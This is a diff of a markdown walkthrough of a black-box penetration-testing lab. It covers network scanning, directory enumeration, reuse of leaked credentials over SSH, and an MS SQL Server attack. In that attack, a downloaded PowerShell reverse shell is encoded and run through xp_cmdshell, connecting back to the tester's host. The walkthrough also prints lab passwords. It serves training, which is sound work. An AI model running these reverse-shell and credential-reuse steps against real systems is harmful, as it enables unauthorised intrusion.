@@ -1,4 +1,4 @@
-# Untitled
+# BB1
 
 ## Prework
 
@@ -13,15 +13,8 @@ sudo openvpn black-box-penetration-test-1.ovpn
 ```bash
 sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap &&
 cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt &&
-sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
-```
-
-```bash
-wget https://gist.githubusercontent.com/fer/4b8e978ab73b0db151594351d1e854d6/raw/1e496bfe6511e5597a81a369f884c7a715cac732/nmap2md.sh
-```
-
-```bash
-sh nmap2md.sh portScan.xml | xclip
+sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml &&
+nmap2md.sh portScan.xml | xclip| xclip
 ```
 
 ## Scanner
@@ -52,11 +45,17 @@ nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
 | 9080/tcp | open | http | Apache Tomcat/Coyote JSP engine 1.1 |
 | 59919/tcp | open | http | Apache httpd 2.4.18 |
 
-#### dirbuster
+{% tabs %}
+{% tab title="Dirbuster" %}
 
+{% endtab %}
+
+{% tab title="Report" %}
 * Target URL: [http://172.16.64.101:8080](http://172.16.64.101:8080)
-* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 * File Extension: \* 
+* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/dirbuster-101-1.png)
 
@@ -108,7 +107,8 @@ You did it!
 
 ![](../../.gitbook/assets/dirbuster-140-2.png)
 
-#### Discovering info
+{% hint style="info" %}
+**Discovering info**
 
 On this url we find the following connection parameters for a SQL database server: [**http://172.16.64.140:80/project/backup/test/sdadas.txt**](http://172.16.64.140:80/project/backup/test/sdadas.txt):
 
@@ -116,6 +116,7 @@ On this url we find the following connection parameters for a SQL database serve
 Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 /var/www/html/project/354253425234234/flag.txt
 ```
+{% endhint %}
 
 {% hint style="success" %}
 **Flag encountered!**
@@ -134,9 +135,13 @@ Now continue to others.
 | :--- | :--- | :--- | :--- |
 | 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
 
+{% hint style="info" %}
+**We use the credentials we discovered while exploring 172.16.64.199:**
+
 ```bash
 sshpass -p dF3334slKw ssh developer@172.16.64.182
 ```
+{% endhint %}
 
 {% hint style="success" %}
 **Flag encountered**!
@@ -166,6 +171,8 @@ Congratulations, you got it!
 | 49670/tcp | open | msrpc | Microsoft Windows RPC |
 | 49943/tcp | open | ms-sql-s | Microsoft SQL Server 2014 12.00.2000 |
 
+#### Attacking MS SQL Server
+
 ```bash
 # Grab payload
 wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;
@@ -175,23 +182,23 @@ sed -i 's/127.0.0.1/172.16.64.10/; s/413/1234/' mini-reverse.ps1;
 
 # Encode payload
 cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3 | base64 -w 0 > encoded_payload;
-cat encoded_payload # We'll use this payload in our shell
-# Open listener In your terminal
+
+# We'll use this payload in our shell
+cat encoded_payload 
 ```
 
 ```bash
+# Leave nc opened in one terminal
 nc -l 1234
 ```
 
 ```bash
+# Connect to database server and inject reverse shell via powershell
 mssql-cli -S 172.16.64.199 -U fooadmin -P fooadmin
-```
-
-```text
-enable_xp_cmdshell
-RECONFIGURE
-xp_cmdshell whoami
-xp_cmdshell powershell -e <payload_from_previous_step>
+> enable_xp_cmdshell
+> RECONFIGURE
+> xp_cmdshell whoami
+> xp_cmdshell powershell -e <payload_from_previous_step>
 ```
 
 {% hint style="success" %}
@@ -206,12 +213,12 @@ Congratulations! You exploited this machine!
 ```
 {% endhint %}
 
-```text
+{% hint style="info" %}
+`ssh://developer:dF3334slKw@172.16.64.182:22` **seems like a ssh connection string:**
+
+```
 PS C:\Users\AdminELS\Desktop> cat id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22############################################################################################################################################################################################
 ```
-
-{% hint style="info" %}
-`ssh://developer:dF3334slKw@172.16.64.182:22` seems like a ssh connection string.
 {% endhint %}
 
